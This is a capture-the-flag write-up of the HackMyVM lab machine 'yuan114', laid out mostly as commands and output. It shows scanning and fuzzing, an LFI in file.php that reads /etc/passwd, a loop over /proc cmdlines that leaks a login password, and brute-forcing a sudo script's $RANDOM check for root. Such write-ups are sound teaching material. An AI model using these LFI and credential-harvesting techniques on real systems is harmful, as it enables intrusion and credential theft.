# yuan114

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| yuan114 | LingMj | Beginner | HackMyVM |

**Summary:** The exploitation of the Yuan114 machine involved a sophisticated chain of vulnerabilities starting with a web application flaw and concluding with a predictable logic error in a system script. Initial network enumeration identified an Apache web server that hosted a PHP application. Through targeted fuzzing, a local file inclusion vulnerability was discovered in the file parameter of the file.php script. This flaw allowed for the inspection of internal system processes via the proc filesystem, which ultimately leaked plaintext credentials for the welcome user from a running service command line. After gaining shell access through SSH, local enumeration revealed two scripts that could be executed with sudo privileges. One of these scripts utilized a basic random number comparison that was susceptible to a brute force attack. By iterating through the range of possible values for the internal Bash random variable, a root shell was successfully spawned, enabling the recovery of both the user and root flags.

---

## Detailed Walkthrough

**1. Network Reconnaissance**

The engagement began with a host discovery scan to identify the target IP address within the local network range. Once the host was located, a comprehensive port scan was conducted to identify active services and their respective versions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan114]
└─$ nmap -sn -PR 192.168.100.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-23 14:09 WIB
Nmap scan report for CLIENT-DESKTOP (192.168.100.1)
Host is up (0.0014s latency).
Nmap scan report for 192.168.100.2
Host is up (0.0014s latency).
Nmap scan report for 192.168.100.206
Host is up (0.0090s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.07 seconds
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan114]
└─$ nmap -sCV -p- -T4 192.168.100.206
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-23 14:10 WIB
Nmap scan report for 192.168.100.206
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Welcome
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.98 seconds
```

**2. Web Content Discovery**

Following the identification of an Apache web server on port 80, a directory enumeration was performed to find hidden files and directories. The scan revealed a PHP script named file.php which returned a server error when accessed directly.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan114]
└─$ gobuster dir -u http://192.168.100.206/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,bak,pem,js,json,sql,conf,old,zip,tar,log -t 50 -k -r
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.206/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,js,conf,old,zip,tar,txt,html,bak,pem,json,sql,log
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 615]
/file.php             (Status: 500) [Size: 0]
/server-status        (Status: 403) [Size: 280]
```

**3. Vulnerability Identification and Exploitation**

A fuzzing process was initiated to determine if the file.php script accepted parameters for local file inclusion. By testing various parameter names against the /etc/passwd file, the file parameter was confirmed to be vulnerable.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan114]
└─$ ffuf -u "http://192.168.100.206/file.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.206/file.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

file                    [Status: 200, Size: 1394, Words: 13, Lines: 27, Duration: 34ms]
```

The successful verification of the LFI flaw allowed for the extraction of the passwd file, which listed a user named welcome with a bash shell.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan114]
└─$ curl -s 'http://192.168.100.206/file.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
```

**4. Credential Recovery via Process Enumeration**

To escalate the impact of the LFI, a loop was used to enumerate active process IDs and read their command line arguments. This technique revealed a service running with the credentials for the welcome user visible in the command string.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan114]
└─$ for i in {1..2000}; do resp=$(curl -s "http://192.168.100.206/file.php?file=/proc/$i/cmdline"); [[ ! -z "$resp" ]] && echo "PID $i: $resp"; done
PID 1: /sbin/init
PID 226: /lib/systemd/systemd-journald
PID 251: /lib/systemd/systemd-udevd
PID 278: /lib/systemd/systemd-timesyncd
PID 324: /lib/systemd/systemd-timesyncd
PID 326: /usr/sbin/cron-f
PID 329: /usr/bin/dbus-daemon--system--address=systemd:--nofork--nopidfile--systemd-activation--syslog-only
PID 331: /usr/sbin/rsyslogd-n-iNONE
PID 332: /lib/systemd/systemd-logind
PID 337: /sbin/dhclient-4-v-i-pf/run/dhclient.enp0s3.pid-lf/var/lib/dhcp/dhclient.enp0s3.leases-I-df/var/lib/dhcp/dhclient6.enp0s3.leasesenp0s3
PID 340: /usr/sbin/rsyslogd-n-iNONE
PID 341: /usr/sbin/rsyslogd-n-iNONE
PID 342: service --user welcome --password 6WX[REDACTED] --host localhost --port 8080infinity
PID 347: /usr/sbin/rsyslogd-n-iNONE
PID 362: /sbin/agetty-o-p -- --nocleartty1linux
PID 375: /usr/bin/python3/usr/share/unattended-upgrades/unattended-upgrade-shutdown--wait-for-signal
PID 393: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
PID 430: /usr/bin/python3/usr/share/unattended-upgrades/unattended-upgrade-shutdown--wait-for-signal
PID 473: /usr/sbin/apache2-kstart
PID 493: /usr/sbin/apache2-kstart
...
```

**5. Initial Foothold and Sudo Enumeration**

Using the recovered password, an SSH session was established as the welcome user. The environment was then checked for sudo permissions, revealing two shell scripts that could be executed with root privileges without a password.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/yuan114]
└─$ ssh welcome@192.168.100.206
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
welcome@192.168.100.206's password:
Linux 114 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat May 23 03:37:56 2026 from 192.168.100.1
welcome@114:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
welcome@114:~$ sudo -l
Matching Defaults entries for welcome on 114:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on 114:
    (ALL) NOPASSWD: /opt/read.sh
    (ALL) NOPASSWD: /opt/short.sh
```

**6. Privilege Escalation**

The contents of the sudo authorized scripts were analyzed to identify potential vectors for privilege escalation. The read.sh script performed a comparison against the root flag, while the short.sh script generated a random number and provided a bash shell if the user input matched that number.

```bash
welcome@114:~$ cat /opt/read.sh
#!/bin/bash

echo "Input the flag:"
if head -1 | grep -q "$(< /root/root.txt)"
then
        echo "Y"
else
        echo "N"
fi
welcome@114:~$ cat /opt/short.sh
#!/bin/bash

PATH=/usr/bin
My_guess=$RANDOM

echo "This is script logic"
cat << EOF
if [ "$1" != "$My_guess" ] ;then
    echo "Nop";
else
    bash -i;
fi
EOF

[ "$1" != "$My_guess" ] && echo "Nop" || bash -i
```

Since the random value was generated within a limited range of zero to thirty two thousand seven hundred sixty seven, a brute force approach was feasible. A simple loop was constructed to iterate through these values until a match was found.

```bash
welcome@114:~$ for i in {0..32767}; do echo -n "$i "; sudo /opt/short.sh "$i" 2>/dev/null; done
...
16836 This is script logic
if [ "16836" != "16836" ] ;then
    echo "Nop";
else
    bash -i;
fi
```

Upon finding the correct number, the script granted an interactive shell. A bash shell was then spawned to stabilize the session as root.

```bash
script -qc /bin/bash /dev/null
```

```bash
root@114:/home/welcome#
```

**7. Flag Retrieval**

The final phase involved verifying the root identity and capturing the flags from the user and root directories.

```bash
root@114:/home/welcome# cd
root@114:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
114
root@114:~# grep -rns "flag{" /home /root
/home/welcome/user.txt:1:flag{user-210[REDACTED]}
/root/root.txt:1:flag{root-c3d[REDACTED]}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Host discovery and port scanning identified a web server on port 80 and an SSH service on port 22.
2. **Vulnerability Discovery**: Directory enumeration and parameter fuzzing revealed a local file inclusion vulnerability in the file parameter of file.php.
3. **Exploitation**: The LFI flaw was leveraged to read the proc filesystem, specifically the cmdline file of active processes, which leaked plaintext credentials for the welcome user.
4. **Internal Enumeration**: Logged in via SSH and discovered sudo privileges for two scripts located in the opt directory.
5. **Privilege Escalation**: Brute forced the random number logic in the short.sh script to gain a root shell and retrieve all flags.

